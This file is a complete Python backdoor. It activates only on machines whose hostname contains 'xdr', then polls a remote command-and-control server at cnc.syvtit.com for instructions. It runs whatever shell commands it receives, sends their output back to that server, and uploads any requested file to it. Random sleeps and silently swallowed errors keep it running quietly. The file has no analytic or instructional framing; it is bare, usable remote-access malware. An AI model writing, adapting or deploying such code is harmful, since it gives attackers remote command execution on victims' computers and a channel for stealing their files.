import socket
import requests
import subprocess
import time
import os
import random
def connect():
    if("xdr" in socket.gethostname().lower()):
        while True:
            req =requests.get('http://cnc.syvtit.com:8080')
            command = req.text
            if 'exit' in command:
                return 1
            elif 'upload' in command:
                upload, path = command.split("*")
                if os.path.exists(path):
                    url = "http://cnc.syvtit.com:8080/upload"
                    files = {'file':open(path,'rb')}
                    r = requests.post(url,files=files)
                else:
                    post_response = requests.post(url='http://cnc.syvtit.com:8080',data='[-] File not found')
            else:
                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                post_response = requests.post(url='http://cnc.syvtit.com:8080',data=cmd.stdout.read())
                post_response = requests.post(url='http://cnc.syvtit.com:8080',data=cmd.stderr.read())
            time.sleep(5)
def main():
    while True:
        try:
            sleep_for=random.randrange(1,10)
            time.sleep(int(sleep_for))
            if connect() == 1:
                break
        except:
            sleep_for=random.randrange(1,10)
            time.sleep(int(sleep_for))
            pass

main()